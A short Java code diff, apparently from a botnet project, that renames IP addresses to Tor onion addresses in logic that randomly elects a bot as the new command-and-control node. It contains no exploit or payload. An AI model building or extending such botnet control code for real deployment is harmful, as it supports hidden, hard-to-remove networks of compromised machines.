@@ -318,18 +318,18 @@ public class Commando {
 				Long lv = Math.round(rand);
 				Integer li = lv.intValue();
 				// System.out.println("long to int" + li);
-				String ip = ccList.get(li);
+				String onionAddress = ccList.get(li);
 				ccList.forEach((botIp) -> System.out.println("Bot Ip abili per il sorteggio" + botIp));
 				// System.out.println("byte seed " + b.toString());
 				// System.out.println(" next double " + d);
 				// System.out.println("size " + size);
 				// System.out.println("rand " + rand);
 				// System.out.println("byte seed " + b.toString());
-				System.out.println("Ho eletto " + ip);
-				if (ccReq.becameCc(ip)) {
-					pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
+				System.out.println("Ho eletto " + onionAddress);
+				if (ccReq.becameCc(onionAddress)) {
+					pServ.setNewKing(bServ.searchBotOnionAddress(onionAddress).getIdBot());
 				} else {
-					ccList.remove(ip);
+					ccList.remove(onionAddress);
 				}
 				System.out.println("Elezione completata inizio il trasferimento");
 			} else {
